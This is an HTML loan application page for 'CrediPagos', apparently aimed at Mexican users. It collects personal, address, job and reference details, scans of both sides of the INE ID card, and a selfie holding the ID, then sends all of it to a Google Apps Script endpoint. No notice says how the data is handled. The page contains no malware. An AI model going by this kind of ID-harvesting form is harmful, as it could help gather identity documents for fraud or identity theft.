<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CrediPagos</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>*{font-family:'Inter',sans-serif}body{background:#F5EDE6}.input-field{border:1.5px solid #E6D5C6;background:#fff;width:100%;padding:13px 14px;border-radius:12px;font-size:14px}.dashed-box{background:#FFFBF8;border:2px dashed #D6BBA8}.file-btn{background:#4A1212;color:white;padding:10px 20px;border-radius:999px;font-size:13px;font-weight:700}input[type=range]{accent-color:#4A1212}</style>
</head>
<body class="min-h-screen flex items-center justify-center p-3">
<div class="w-full max-w-[480px] bg-white rounded-[24px] p-6 shadow-xl">
<img src="logo.png" style="width:170px;margin:auto;display:block">
<p class="text-center text-xs text-gray-400 mt-2">Paso <span id="pasoNum">1</span> de 5</p>
<div class="h-2 bg-[#F5EDE6] rounded-full my-3"><div id="bar" class="h-2 bg-[#4A1212] rounded-full" style="width:20%"></div></div>

<div id="s1" class="step">
<h2 class="font-bold text-[#4A1212] mb-3">👤 Datos Personales</h2>
<input id="nombre" class="input-field mb-2" placeholder="Nombre(s)">
<div class="flex gap-2 mb-2"><input id="apP" class="input-field" placeholder="Apellido Paterno"><input id="apM" class="input-field" placeholder="Apellido Materno"></div>
<input id="tel" class="input-field mb-4" placeholder="Teléfono">
<label class="text-xs font-bold text-[#4A1212]">Monto a solicitar: <span id="montoLabel" class="text-[16px] font-black">$2,000 M.X</span></label>
<input type="range" id="monto" min="2000" max="10000" step="1000" value="2000" class="w-full mb-5" oninput="document.getElementById('montoLabel').innerText='$'+Number(this.value).toLocaleString('es-MX')+' M.X'">
<label class="dashed-box rounded-[16px] p-5 flex justify-between items-center mb-3"><div><p class="text-[14px] font-bold">INE Frente</p><p class="text-[11px] text-gray-400">Foto clara</p></div><span id="b1" class="file-btn"><input type="file" id="ine1" accept="image/*" class="hidden" onchange="ok('b1')">Subir</span></label>
<label class="dashed-box rounded-[16px] p-5 flex justify-between items-center mb-3"><div><p class="text-[14px] font-bold">INE Reverso</p><p class="text-[11px] text-gray-400">Foto clara</p></div><span id="b2" class="file-btn"><input type="file" id="ine2" accept="image/*" class="hidden" onchange="ok('b2')">Subir</span></label>
<label class="dashed-box rounded-[16px] p-5 flex justify-between items-center mb-5"><div><p class="text-[14px] font-bold">Comprobante Domicilio</p><p class="text-[11px] text-gray-400">Luz, agua, etc</p></div><span id="b3" class="file-btn"><input type="file" id="comp" accept="image/*" class="hidden" onchange="ok('b3')">Subir</span></label>
<button onclick="nextStep(2)" class="w-full bg-[#4A1212] text-white p-4 rounded-full font-bold">Continuar →</button>
</div>

<div id="s2" class="step hidden">
<h2 class="font-bold text-[#4A1212] mb-3">🏠 Domicilio</h2>
<input id="calle" class="input-field mb-2" placeholder="Calle"><div class="flex gap-2 mb-2"><input id="numero" class="input-field" placeholder="No."><input id="colonia" class="input-field" placeholder="Colonia"></div><input id="cp" class="input-field mb-2" placeholder="CP"><div class="flex gap-2 mb-2"><select id="estado" class="input-field" onchange="cargaMun()"></select><select id="municipio" class="input-field"></select></div><textarea id="refDom" class="input-field mb-3" placeholder="Referencias del domicilio"></textarea>
<div class="flex gap-2"><button onclick="nextStep(1)" class="w-1/3 bg-[#F5EDE6] p-4 rounded-full">Atrás</button><button onclick="nextStep(3)" class="flex-1 bg-[#4A1212] text-white p-4 rounded-full">Siguiente</button></div>
</div>

<div id="s3" class="step hidden">
<h2 class="font-bold text-[#4A1212] mb-3">💼 Trabajo</h2>
<input id="ocup" class="input-field mb-2"  placeholder="Ocupación"><input id="ingreso" class="input-field mb-2" placeholder="Ingreso Semanal"><input id="dirTrab" class="input-field mb-2" placeholder="Dirección del Trabajo"><input id="antig" class="input-field mb-4" placeholder="Antigüedad">
<div class="flex gap-2"><button onclick="nextStep(2)" class="w-1/3 bg-[#F5EDE6] p-4 rounded-full">Atrás</button><button onclick="nextStep(4)" class="flex-1 bg-[#4A1212] text-white p-4 rounded-full">Siguiente</button></div>
</div>

<div id="s4" class="step hidden">
<h2 class="font-bold text-[#4A1212] mb-3">👥 Referencias</h2>
<input id="r1nom" class="input-field mb-2" placeholder="Referencia 1 - Nombre completo"><input id="r1tel" class="input-field mb-2" placeholder="Referencia 1 - Teléfono"><input id="r2nom" class="input-field mb-2" placeholder="Referencia 2 - Nombre completo"><input id="r2tel" class="input-field mb-2" placeholder="Referencia 2 - Teléfono"><input id="recom" class="input-field mb-4" placeholder="¿Quién te recomendó?">
<div class="flex gap-2"><button onclick="nextStep(3)" class="w-1/3 bg-[#F5EDE6] p-4 rounded-full">Atrás</button><button onclick="nextStep(5)" class="flex-1 bg-[#4A1212] text-white p-4 rounded-full">Siguiente</button></div>
</div>

<div id="s5" class="step hidden">
<h2 class="font-bold text-[#4A1212] mb-1">📸 Selfie Final</h2>
<p class="text-xs bg-[#FFF3E8] border border-[#E6D5C6] p-3 rounded-xl mb-3 text-[#4A1212]">⚠️ Selfie sosteniendo tu INE al frente, rostro visible y legible. Sin lentes ni gorra.</p>
<label class="dashed-box rounded-[16px] p-5 flex justify-between items-center mb-4"><div><p class="text-[14px] font-bold">Selfie con INE al frente</p><p class="text-[11px] text-gray-400">Cámara frontal</p></div><span id="b4" class="file-btn"><input type="file" id="selfie" accept="image/*" capture="user" class="hidden" onchange="ok('b4')">Cámara</span></label>
<div id="status" class="text-center text-[13px] font-bold text-[#4A1212] min-h-[20px] mb-2"></div><div id="errBox" class="hidden bg-red-50 text-red-700 text-xs p-3 rounded-xl mb-2"></div>
<div class="flex gap-2"><button onclick="nextStep(4)" class="w-1/3 bg-[#F5EDE6] p-4 rounded-full">Atrás</button><button id="btnEnviar" onclick="enviar()" class="flex-1 bg-[#4A1212] text-white p-4 rounded-full font-bold">Enviar Solicitud</button></div>
</div>

<div id="s6" class="step hidden text-center py-10"><div class="w-20 h-20 bg-[#4A1212] text-white rounded-full flex items-center justify-center text-4xl mx-auto mb-4">✓</div><h2 class="text-2xl font-black text-[#4A1212]">¡Enviado!</h2><p id="finalID" class="font-bold mt-2"></p></div>
</div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyoHA4aRc6pLdu1rvbOsIP0R6cz7Pani1P8aVaiu2mtJN9gT5E-9itTlXmO0MyE4dCRzQ/exec";
const estadosMuns={"Aguascalientes":["Aguascalientes","Asientos","Calvillo","Jesús María","Rincón de Romos"],"Baja California":["Tijuana","Mexicali","Ensenada","Rosarito","Tecate"],"Baja California Sur":["La Paz","Los Cabos","Comondú","Loreto","Mulegé"],"Campeche":["Campeche","Carmen","Champotón","Escárcega","Calkiní"],"Chiapas":["Tuxtla Gutiérrez","Tapachula","San Cristóbal","Reforma","Juárez","Pichucalco","Comitán"],"Chihuahua":["Chihuahua","Juárez","Delicias","Cuauhtémoc","Parral"],"Ciudad de México":["Álvaro Obregón","Iztapalapa","Coyoacán","Gustavo A. Madero","Benito Juárez"],"Coahuila":["Saltillo","Torreón","Monclova","Piedras Negras","Acuña"],"Colima":["Colima","Manzanillo","Villa de Álvarez","Tecomán"],"Durango":["Durango","Gómez Palacio","Lerdo","Pueblo Nuevo"],"Guanajuato":["León","Irapuato","Celaya","Salamanca","Guanajuato"],"Guerrero":["Acapulco","Chilpancingo","Iguala","Zihuatanejo","Taxco"],"Hidalgo":["Pachuca","Tulancingo","Tula","Huejutla","Ixmiquilpan"],"Jalisco":["Guadalajara","Zapopan","Tlaquepaque","Tonalá","Puerto Vallarta"],"Estado de México":["Ecatepec","Nezahualcóyotl","Toluca","Naucalpan","Tlalnepantla"],"Michoacán":["Morelia","Uruapan","Zamora","Lázaro Cárdenas","Apatzingán"],"Morelos":["Cuernavaca","Jiutepec","Cuautla","Temixco","Yautepec"],"Nayarit":["Tepic","Bahía de Banderas","Santiago Ixcuintla","Compostela"],"Nuevo León":["Monterrey","Guadalupe","San Nicolás","Apodaca","Santa Catarina"],"Oaxaca":["Oaxaca","Juchitán","Salina Cruz","Tuxtepec","Huajuapan"],"Puebla":["Puebla","Tehuacán","San Martín Texmelucan","Atlixco","Cholula"],"Querétaro":["Querétaro","San Juan del Río","Corregidora","El Marqués"],"Quintana Roo":["Cancún","Playa del Carmen","Chetumal","Cozumel","Tulum"],"San Luis Potosí":["San Luis Potosí","Soledad","Ciudad Valles","Matehuala","Rioverde"],"Sinaloa":["Culiacán","Mazatlán","Los Mochis","Guasave","Guamúchil"],"Sonora":["Hermosillo","Ciudad Obregón","Nogales","San Luis Río Colorado","Navojoa"],"Tabasco":["Huimanguillo","Cárdenas","Comalcalco","Paraíso","Cunduacán","Centro","Jalpa de Méndez","Nacajuca","Macuspana","Teapa","Tenosique","Balancán","Centla","Tacotalpa","Jalapa","Emiliano Zapata","Jonuta"],"Tamaulipas":["Reynosa","Matamoros","Nuevo Laredo","Tampico","Victoria"],"Tlaxcala":["Tlaxcala","Apizaco","Huamantla","Chiautempan"],"Veracruz":["Veracruz","Xalapa","Coatzacoalcos","Córdoba","Orizaba","Poza Rica","Minatitlán","Las Choapas","Agua Dulce"],"Yucatán":["Mérida","Valladolid","Tizimín","Progreso","Umán"],"Zacatecas":["Zacatecas","Fresnillo","Guadalupe","Jerez","Río Grande"]};
function cargaEstados(){let sel=document.getElementById('estado');sel.innerHTML="";Object.keys(estadosMuns).forEach(e=>{let o=document.createElement('option');o.value=e;o.text=e;sel.appendChild(o);});sel.value="Tabasco";cargaMun();}
function cargaMun(){let est=document.getElementById('estado').value;let munSel=document.getElementById('municipio');munSel.innerHTML="";(estadosMuns[est]||["Otro"]).forEach(m=>{let o=document.createElement('option');o.value=m;o.text=m;munSel.appendChild(o);});}
cargaEstados();
function nextStep(n){document.querySelectorAll('.step').forEach(s=>s.classList.add('hidden'));document.getElementById('s'+n).classList.remove('hidden');document.getElementById('pasoNum').innerText=n>5?5:n;document.getElementById('bar').style.width=(n*20)+'%';}
function ok(id){let e=document.getElementById(id);e.innerHTML='✅ Listo';e.style.background='#166534';}
async function toB64(file){if(!file)return'';const b=await new Promise(r=>{let fr=new FileReader();fr.onload=()=>r(fr.result);fr.onerror=()=>r('');fr.readAsDataURL(file);});if(!b)return'';return await new Promise(res=>{const img=new Image();img.onload=()=>{try{const c=document.createElement('canvas');let w=img.width,h=img.height,m=1024;if(w>m||h>m){if(w>h){h*=m/w;w=m;}else{w*=m/h;h=m;}}c.width=w;c.height=h;c.getContext('2d').drawImage(img,0,0,w,h);res(c.toDataURL('image/jpeg',0.55));}catch(e){res(b);}};img.onerror=()=>res(b);img.src=b;});}
async function enviar(){
  const gv=id=>document.getElementById(id)?.value||'';const gf=id=>document.getElementById(id)?.files?.[0]||null;
  let nom=gv('nombre').trim(),apP=gv('apP').trim(),tel=gv('tel').trim();if(!nom||!apP||!tel){alert('Falta nombre, apellido y teléfono');return;}
  let id=(nom[0]+apP[0]).toUpperCase()+tel.slice(-4)+'-'+Date.now().toString().slice(-4);
  let btn=document.getElementById('btnEnviar'),st=document.getElementById('status');btn.disabled=true;btn.innerText='Enviando...';
  try{
    st.innerText='Comprimiendo 1/4...';let ine1=await toB64(gf('ine1'));
    st.innerText='Comprimiendo 2/4...';let ine2=await toB64(gf('ine2'));
    st.innerText='Comprimiendo 3/4...';let comp=await toB64(gf('comp'));
    st.innerText='Comprimiendo 4/4...';let selfie=await toB64(gf('selfie'));
    st.innerText='Enviando a Google...';
    let payload={id:id,nombreCompleto:nom+' '+apP+' '+gv('apM'),tel:tel,monto:gv('monto'),calle:gv('calle'),numero:gv('numero'),colonia:gv('colonia'),cp:gv('cp'),estado:gv('estado'),municipio:gv('municipio'),refDom:gv('refDom'),ocup:gv('ocup'),ingreso:gv('ingreso'),dirTrab:gv('dirTrab'),antig:gv('antig'),r1nom:gv('r1nom'),r1tel:gv('r1tel'),r2nom:gv('r2nom'),r2tel:gv('r2tel'),recom:gv('recom'),ine1:ine1,ine2:ine2,comp:comp,selfie:selfie};
    await fetch(SCRIPT_URL,{method:'POST',mode:'no-cors',body:JSON.stringify(payload)});
    document.getElementById('finalID').innerText=id;nextStep(6);
  }catch(e){document.getElementById('errBox').innerText=e.message;document.getElementById('errBox').classList.remove('hidden');st.innerText='';btn.disabled=false;btn.innerText='Reintentar';}
}
</script>
</body>
</html>
